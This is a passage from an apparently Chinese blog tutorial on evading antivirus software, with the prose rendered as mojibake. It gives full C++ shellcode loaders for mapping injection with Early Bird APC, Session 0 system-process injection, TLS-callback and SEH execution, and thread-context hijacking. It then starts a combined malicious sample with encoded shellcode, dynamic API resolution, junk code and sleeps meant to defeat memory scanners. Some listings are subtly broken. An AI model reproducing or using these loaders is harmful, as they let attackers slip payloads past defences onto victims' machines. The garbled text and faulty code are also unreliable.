class="line">    <span class="built_in">ResumeThread</span>(pi.hThread);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>è¿™ä¸ªå…æ€æ‰‹æ³•ååˆ†çš„å¥½ç”¨ï¼Œæ¨èå†ç¨å¾®æ­é…ä¸€ä¸‹å…¶ä»–è§„é¿æ‰‹æ®µå°±å¯ä»¥ç»•è¿‡ç»å¤§å¤šæ•°æ€è½¯åšåˆ°æ— æ„Ÿä¸Šçº¿ï¼Œå®é™…ä»£ç å’Œä¸Šçº¿æ•ˆæœè´´åœ¨æ–‡æœ«ã€‚<p></p><p><em><strong>Mapping Injection (å†…å­˜æ˜ å°„æ³¨å…¥)</strong></em><br>å…ˆåœ¨ç‰©ç†å†…å­˜ä¸­å¼€è¾Ÿä¸€æ®µç©ºé—´ç”¨äºå†™å…¥æ¶æ„ shellcodeï¼Œåç»­åˆ©ç”¨ MapViewOfFile2 å°†è¯¥æ¶æ„å†…å­˜åŒºåŸŸæ˜ å°„åˆ°æŒ‡å®šè¿›ç¨‹ä¸­çš„è™šæ‹Ÿå†…å­˜ä¸­å»ï¼Œè¾¾åˆ° shellcode æ³¨å…¥çš„æ•ˆæœã€‚<br>æ³¨å…¥æµç¨‹ï¼š<br>1ã€åˆ›å»º Mapping å¥æŸ„<br>2ã€å°† shellcode å¤åˆ¶åˆ°è¯¥ç‰©ç†å†…å­˜åœ°å€ä¸­å»<br>3ã€å°†è¯¥æ®µç‰©ç†å†…å­˜æ˜ å°„åˆ°è™šæ‹Ÿå†…å­˜ä¸­<br>4ã€åˆ©ç”¨ä»»æ„æ–¹æ³•æ‰§è¡Œåˆ°è¯¥åœ°å€çš„ shellcode</p><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (lib, <span class="string">&quot;OneCore.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] = &#123;<span class="number">0x12</span>&#125;;  <span class="comment">//shellcode</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">     STARTUPINFO si = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">     PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">     si.cb = <span class="built_in">sizeof</span>(STARTUPINFO);</span><br><span class="line">     </span><br><span class="line">     HANDLE hMapping = <span class="built_in">CreateFileMapping</span>(INVALID_HANDLE_VALUE, <span class="literal">NULL</span>, PAGE_EXECUTE_READWRITE, <span class="number">0</span>, <span class="built_in">sizeof</span>(shellcode), <span class="literal">NULL</span>);</span><br><span class="line">     LPVOID lpMapAddress = <span class="built_in">MapViewOfFile</span>(hMapping, FILE_MAP_WRITE, <span class="number">0</span>, <span class="number">0</span>, <span class="built_in">sizeof</span>(shellcode));</span><br><span class="line">     <span class="built_in">memcpy</span>((PVOID)lpMapAddress, shellcode, <span class="built_in">sizeof</span>(shellcode));</span><br><span class="line">     <span class="built_in">CreateProcessA</span>(<span class="string">&quot;C:\\Windows\\System32\\notepad.exe&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPSTARTUPINFOA)&amp;si, &amp;pi);</span><br><span class="line">     LPVOID lpMapAddressRemote = <span class="built_in">MapViewOfFile2</span>(hMapping, pi.hProcess, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>, PAGE_EXECUTE_READ);</span><br><span class="line">     </span><br><span class="line">     <span class="built_in">QueueUserAPC</span>((PAPCFUNC)lpMapAddressRemote, pi.hThread, <span class="literal">NULL</span>);</span><br><span class="line">     <span class="built_in">ResumeThread</span>(pi.hThread);</span><br><span class="line">     <span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line">     <span class="built_in">CloseHandle</span>(hMapping);</span><br><span class="line">     <span class="built_in">UnmapViewOfFile</span>(lpMapAddress);</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//Mapping Injection + Early Bird</span></span><br></pre></td></tr></table></figure><br>å¯ä»¥å’Œå…¶ä»–æ‰‹æ®µç»„åˆï¼Œæ¯”å¦‚ Early Bird æ¥è¾¾åˆ°å¼ºè§„é¿çš„æ•ˆæœ<p></p><p><em><strong>Bypass Session 0 Injection (ç³»ç»Ÿè¿›ç¨‹æ³¨å…¥ç»•è¿‡)</strong></em><br>æ— æ³•ç›´æ¥å‘ç³»ç»Ÿè¿›ç¨‹å†…æ³¨å…¥ shellcode æˆ–è€… dllï¼ŒåŸå› æ˜¯ R3 çš„ CreateRemoteThread åœ¨ R0 ä¸­çš„å‡½æ•°åŸå‹ ZwCreateThreadEx åœ¨å†…éƒ¨è°ƒç”¨æ—¶ä¼šå°†ç¬¬ä¸ƒä¸ªå‚æ•°è®¾ä¸º 1 å¯¼è‡´ä¼šä½¿æ–°åˆ›å»ºçš„çº¿ç¨‹å¤„äºæŒ‚èµ·çŠ¶æ€ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„æ¶æ„ shellcode æ— æ³•è¢«æ‰§è¡Œï¼Œåªéœ€è¦å°†ç¬¬ä¸ƒä¸ªå‚æ•°ç½® 0 å³å¯ç»•è¿‡ã€‚<br>æ³¨å…¥æµç¨‹ï¼š<br>1ã€åˆ©ç”¨å‡½æ•°åŸå‹è‡ªå®šä¹‰ ZwCreateThreadEx å‡½æ•°<br>2ã€é€šè¿‡ç³»ç»Ÿè·å– ntdll.dll å¹¶åŠ è½½ ZwCreateThreadEx å‡½æ•°<br>3ã€ç”³è¯·ä¸€å—å†…å­˜ç©ºé—´å¹¶å°† shellcode å†™å…¥<br>4ã€åˆ©ç”¨ ZwCreateThreadEx å°† shellcode æ³¨å…¥åˆ°ç³»ç»Ÿè¿›ç¨‹ä¸­ï¼Œå°†ç¬¬ä¸ƒä¸ªå‚æ•°ç½® 0</p><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* typedef_ZwCreateThreadEx)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PHANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">    ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG CreateThreadFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">    SIZE_T ZeroBits,</span></span></span><br><span class="line"><span class="params"><span class="function">    SIZE_T StackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    SIZE_T MaximumStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID pUnkown)</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* typedef_ZwCreateThreadEx)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PHANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">    ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">    BOOL CreateSuspended,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD dwStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD dw1,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD dw2,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID pUnkown)</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">     <span class="comment">//char DllPath[] = &quot;C:\\Users\\Black Sheep\\source\\repos\\sesion0\\x64\\Debug\\TestDll.dll&quot;;</span></span><br><span class="line">      <span class="type">char</span> shellcode[] = &#123;<span class="number">0x12</span>&#125;   <span class="comment">//shellcode</span></span><br><span class="line">     HANDLE hRemoteThread;</span><br><span class="line">    HANDLE hNtModule = <span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    typedef_ZwCreateThreadEx ZwCreateThreadEx = <span class="built_in">GetProcAddress</span>(hNtModule, <span class="string">&quot;ZwCreateThreadEx&quot;</span>);</span><br><span class="line">    HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, <span class="number">1516</span>(ç³»ç»Ÿè¿›ç¨‹pid));</span><br><span class="line">    LPVOID lpBaseeAddresss = (LPVOID)<span class="built_in">VirtualAllocEx</span>(pi.hProcess, <span class="literal">NULL</span>, <span class="number">0X1000</span>, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">     <span class="built_in">WriteProcessMemory</span>(hProcess, lpBaseAddress, shellcode, <span class="built_in">sizeof</span>(shellcode), <span class="number">0</span>);</span><br><span class="line">      <span class="built_in">ZwCreateThreadEx</span>(&amp;hRemoteThread, PROCESS_ALL_ACCESS, <span class="literal">NULL</span>, hProcess, (LPTHREAD_START_ROUTINE)lpBaseAddress, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">   </span><br><span class="line">       <span class="built_in">CloseHandle</span>(hRemoteThread);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">          <span class="built_in">FreeLibrary</span>(hNtModule);</span><br><span class="line">           <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p><em><strong>TLS Code Execute (TLS ä»£ç æ‰§è¡Œ)</strong></em><br>çº¿ç¨‹å±€éƒ¨å­˜å‚¨ï¼ˆThread Local Storageï¼ŒTLSï¼‰ç”¨æ¥å°†æ•°æ®ä¸ä¸€ä¸ªæ­£åœ¨æ‰§è¡Œçš„æŒ‡å®šçº¿ç¨‹å…³è”èµ·æ¥ï¼Œå…¶æä¾›äº†å›è°ƒå‡½æ•°å› æ­¤å¯ä»¥åˆ©ç”¨è¯¥å‡½æ•°è¾¾åˆ°æ‰§è¡Œ shellcode çš„æ•ˆæœï¼Œä¸»è¦ç¼–å†™çš„æ˜¯ Reason å…¶è§„å®šå’Œ dll è°ƒç”¨æ—¶ä¸€æ ·<strong> DLL_PROCESS_ATTACH</strong></p><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/section:.data,RWE&quot;</span>) </span></span><br><span class="line"><span class="type">char</span> shellcode[] = &#123;<span class="number">0x12</span>&#125;  <span class="comment">//shellcode</span></span><br><span class="line"></span><br><span class="line">VOID NTAPI <span class="built_in">TlsCallBack</span>(PVOID DllHandle, DWORD dwReason, PVOID Reserved)</span><br><span class="line"><span class="comment">//DllHandleæ¨¡å—å¥æŸ„ã€Reasonè°ƒç”¨åŸå› ã€ ReservedåŠ è½½æ–¹å¼ï¼ˆæ˜¾å¼/éšå¼ï¼‰</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (dwReason == DLL_PROCESS_ATTACH)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//å†™æ‰§è¡Œå‡½æ•°ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨å…¶ä»–æ‰‹æ®µè¿›è¡Œshellcodeæ³¨å…¥</span></span><br><span class="line">        ((<span class="built_in">void</span>(WINAPI*)(<span class="type">void</span>)) &amp; shellcode)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ä½¿ç”¨TLSéœ€è¦åœ¨ç¨‹åºä¸­æ–°å»ºä¸€ä¸ª.tlsæ®µä¸“é—¨å­˜æ”¾TLSæ•°æ®ï¼Œç”³æ˜ä½¿ç”¨</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:__tls_used&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (linker, <span class="string">&quot;/INCLUDE:__tls_callback&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg (<span class="string">&quot;.CRT$XLB&quot;</span>)</span></span><br><span class="line"><span class="comment">//.CRTè¡¨æ˜æ˜¯ä½¿ç”¨C RunTimeæœºåˆ¶ï¼Œ$åé¢çš„XLBä¸­ï¼šXè¡¨ç¤ºéšæœºçš„æ ‡è¯†</span></span><br><span class="line"><span class="comment">//Lè¡¨ç¤ºæ˜¯TLS callback sectionï¼ŒBå¯ä»¥è¢«æ¢æˆBåˆ°Yä¹‹é—´çš„ä»»æ„ä¸€ä¸ªå­—æ¯ï¼Œ</span></span><br><span class="line"><span class="comment">//ä½†æ˜¯ä¸èƒ½ä½¿ç”¨â€œ.CRT$XLAâ€å’Œâ€œ.CRT$XLZâ€ï¼Œå› ä¸ºâ€œ.CRT$XLAâ€å’Œâ€œ.CRT$XLZâ€æ˜¯ç”¨äºtlssup.objçš„ã€‚</span></span><br><span class="line">EXTERN_C PIMAGE_TLS_CALLBACK _tls_callback = TlsCallBack;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg ()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>åªæ˜¯ä¸€ç§æ‰§è¡Œæ‰‹æ®µï¼Œä¾ç„¶å¯ä»¥é…åˆå…¶ä»–æ‰‹æ®µç»„åˆã€‚<p></p><p><em><strong>SEH Code Execute (SEH å¼‚å¸¸å¤„ç†ä»£ç æ‰§è¡Œ)</strong></em><br>SEH (Structured Exception Handling) ç»“æ„åŒ–å¼‚å¸¸å¤„ç†ï¼Œæ˜¯ windows æ“ä½œç³»ç»Ÿé»˜è®¤çš„é”™è¯¯å¤„ç†æœºåˆ¶ï¼Œé€šè¿‡ä¸»åŠ¨æŠ›å‡ºå¼‚å¸¸ç„¶åå°†æ¶æ„ä»£ç æ’å…¥å³å¯è§¦å‘ï¼Œå¯ç”¨äºåè°ƒè¯•ã€‚</p><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/section:.data,RWE&quot;</span>)</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> b = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">ExceptFilter</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    b = <span class="number">1</span>;</span><br><span class="line">    ((<span class="built_in">void</span>(*NTAPI)(<span class="type">void</span>)) &amp; shellcode)();</span><br><span class="line">    <span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;<span class="comment">//è¿”å›å‡ºé”™ä½ç½®é‡æ–°æ‰§è¡Œ</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    _try</span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> c = a / b;  <span class="comment">//åªè¦èƒ½è§¦å‘å¼‚å¸¸å³å¯</span></span><br><span class="line">    &#125;</span><br><span class="line">    _except(<span class="built_in">ExceptFilter</span>()) &#123;</span><br><span class="line"></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>éœ€è¦ä¸»åŠ¨è§¦å‘å¼‚å¸¸ï¼Œå½“ç„¶å¯ä»¥å¡«å……å¤§é‡ä»£ç å°†è§¦å‘å¼‚å¸¸çš„ä»£ç å†™çš„å¾ˆéšè”½ï¼Œè¿˜å¯ä»¥åšåˆ°åè°ƒè¯•çš„æ•ˆæœï¼Œä¹Ÿéœ€è¦é…åˆå…¶ä»–æ‰‹æ®µé£Ÿç”¨ã€‚<p></p><p><em><strong>SetContext Hijack Thread (çº¿ç¨‹ä¸Šä¸‹æ–‡ç¯å¢ƒåŠ«æŒ)</strong></em><br>ç®€å•ç†è§£å°±æ˜¯åŠ«æŒçº¿ç¨‹çš„ä¸Šä¸‹æ–‡ç¯å¢ƒï¼Œç„¶åå¼ºè¡Œå°† eip/rip æŒ‡å‘ shellcode å¹¶æ‰§è¡Œã€‚<br>åŠ«æŒæµç¨‹ï¼š<br>1ã€åˆ›å»ºä¸€ä¸ªæŒ‚èµ·çš„åˆæ³•è¿›ç¨‹<br>2ã€å°†æ¶æ„ shellcode å†™å…¥è¯¥è¿›ç¨‹<br>3ã€å°† eip/rip æŒ‡å‘è¯¥åœ°å€<br>4ã€æ¢å¤çº¿ç¨‹</p><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> shellcode[] = &#123;<span class="number">0x12</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    STARTUPINFOA si = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    si.cb = <span class="built_in">sizeof</span>(si);</span><br><span class="line"></span><br><span class="line">    PROCESS_INFORMATION pi = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    </span><br><span class="line">     <span class="built_in">CreateProcessA</span>(<span class="literal">NULL</span>, (LPSTR)<span class="string">&quot;notepad&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line">     <span class="built_in">SuspendThread</span>(pi.hThread);</span><br><span class="line">     LPVOID lpBuffer = <span class="built_in">VirtualAllocEx</span>(pi.hProcess, <span class="literal">NULL</span>, <span class="built_in">sizeof</span>(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">     <span class="built_in">WriteProcessMemory</span>(pi.hProcess, lpBuffer, shellcode, <span class="built_in">sizeof</span>(shellcode), <span class="literal">NULL</span>);</span><br><span class="line">     </span><br><span class="line">     CONTEXT ctx = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">     ctx.ContextFlags = CONTEXT_ALL;</span><br><span class="line">     <span class="built_in">GetThreadContext</span>(pi.hThread, &amp;ctx);</span><br><span class="line">     ctx.Rip = (DWORD64)lpBuffer;</span><br><span class="line">     <span class="built_in">SetThreadContext</span>(pi.hThread, &amp;ctx);</span><br><span class="line">     <span class="built_in">ResumeThread</span>(pi.hThread);</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><h4 id="æœ¬åœ°æµ‹è¯•æ•ˆæœå’Œå…¶ä»–æ‰‹æ³•æ¼”ç¤º"><a class="anchor" href="#æœ¬åœ°æµ‹è¯•æ•ˆæœå’Œå…¶ä»–æ‰‹æ³•æ¼”ç¤º">#</a> æœ¬åœ°æµ‹è¯•æ•ˆæœå’Œå…¶ä»–æ‰‹æ³•æ¼”ç¤º</h4><p>æœ¬æ¬¡ç¼–å†™çš„æ¶æ„æ ·æœ¬æ‰‹æ³•ç»„åˆä¸ºï¼šsgn + Early Bird + RW/RX/NOA è½¬æ¢ + è‡ªå†™ Win32API + junkCode å¡«å…… + Sleep (15000)(å¾ªç¯çœŸç¡çœ ) è§„é¿ä¸»åŠ¨å†…å­˜æ‰«æ<br>ä¸»è¦ä»£ç ï¼š<br></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> fish[<span class="number">307910</span>] = &#123;......&#125;   <span class="comment">//sgnåçš„shellcode</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* text_path = <span class="string">&quot;C:\\Windows\\System32\\notepad.exe&quot;</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* CreateP = <span class="string">&quot;CreateProcessA&quot;</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* VirPro = <span class="string">&quot;VirtualProtect&quot;</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* VirAloc = <span class="string">&quot;VirtualAllocEx&quot;</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* WriteMem = <span class="string">&quot;WriteProcessMemory&quot;</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* QueAPC = <span class="string">&quot;QueueUserAPC&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(WINAPI* pCreateProcessA)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	LPCSTR                lpApplicationName,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPSTR                 lpCommandLine,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPSECURITY_ATTRIBUTES lpProcessAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">	BOOL                  bInheritHandles,</span></span></span><br><span class="line"><span class="params"><span class="function">	DWORD                 dwCreationFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID                